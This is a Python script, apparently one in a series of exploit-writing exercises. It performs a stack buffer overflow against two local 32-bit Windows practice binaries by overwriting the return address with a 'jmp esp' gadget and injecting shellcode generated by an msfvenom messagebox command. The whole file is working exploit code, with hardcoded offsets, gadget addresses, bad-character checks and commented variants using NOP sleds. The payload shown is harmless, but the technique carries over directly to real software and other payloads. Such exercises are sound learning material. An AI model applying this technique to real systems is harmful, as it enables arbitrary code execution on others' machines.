# 6th exploit: buffer overflow + jump to stack + msfvenom payload

import sys

from pwintools import *

# 64 bit has non-executable stack
processes = [
	Process('2_gets_bs_gcc_32.exe'),
	Process('2_gets_bs_vs_32.exe'),
]

retAddrOffs = [
	48,
	40,
]

# jmp esp
jmpEspAddr = [
	0x401712,
	0x4070CA,
]

# too big:
# msfvenom --arch x86 --platform windows --format raw --payload windows/messagebox -o TMP --bad-chars '\x0d\x0a'

f = open('TMP', 'rb')
injection = f.read()
f.close()

#injection[0:6] = b'\x90\xe8\x00\x00\x00\x00' # nop; call $+5
# nop; call $+5
#injection = b'\x90\xe8\x00\x00\x00\x00' + injection[6:]
#injection = b'\x90\xe8\x00\x00\x00\x00' + injection[2:7] + injection[11:]

for b in injection:
	if 0x0d == b or 0x0a == b:
		print('Error: assembly contains ' + str(b))
		sys.exit()

#sys.exit()

for i in range(len(processes)):
	processes[i].recvuntil(b'name:\r\n')
	print(b'Injecting ' + injection)
	#processes[i].sendline(b'a'*retAddrOffs[i] + p32(jmpEspAddr[i]) + b'\x90'*16 + injection)
	processes[i].sendline(b'a'*retAddrOffs[i] + p32(jmpEspAddr[i]) + injection)
	print(processes[i].recvall())

# i = 0
# import os;
# #os.write(1, b'a'*retAddrOffs[i] + p32(jmpEspAddr[i]) + b'\x90'*16 + injection + b'\r\n')
# os.write(1, b'a'*retAddrOffs[i] + p32(jmpEspAddr[i]) + injection + b'\r\n')
